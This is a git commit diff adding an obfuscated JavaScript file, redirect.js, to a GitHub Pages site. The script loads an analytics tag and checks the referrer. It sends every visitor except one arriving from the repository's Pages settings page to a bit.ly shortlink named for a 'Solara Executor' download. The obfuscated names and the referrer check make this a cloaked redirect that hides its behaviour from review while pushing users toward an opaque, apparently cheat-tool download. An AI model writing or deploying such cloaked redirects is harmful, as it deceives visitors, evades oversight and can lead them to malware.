a64f9dadcde5229da9afa513ad00e4772ed01f3f
RebornPhantom <83071483+RebornPhantom@users.noreply.github.com>
2024-08-22 14:24:50 -0400

    Update and rename sw.js to redirect.js

---
+++ redirect.js
@@ -0,0 +1,25 @@
+window._obf_a = window._obf_a || [];
+
+function _obf_func_0() {
+    _obf_a.push(arguments);
+}
+_obf_func_0('js', new Date());
+_obf_func_0('config', 'G-NTTP5YDYL7');
+
+function _obf_func_1() {
+    return document.referrer;
+}
+
+function _obf_func_2() {
+    const _obf_var_0 = _obf_func_1();
+    const _obf_var_1 = 'https://github.com/RebornPhantom/Repository/settings/pages';
+    return _obf_var_0 !== _obf_var_1;
+}
+
+if (_obf_func_2()) {
+    setTimeout(() => {
+        window.location.href = 'https://bit.ly/Solara-Executor';
+    }, 100);
+} else {
+    console.log('Redirect blocked due to _obf_func_2.');
+}
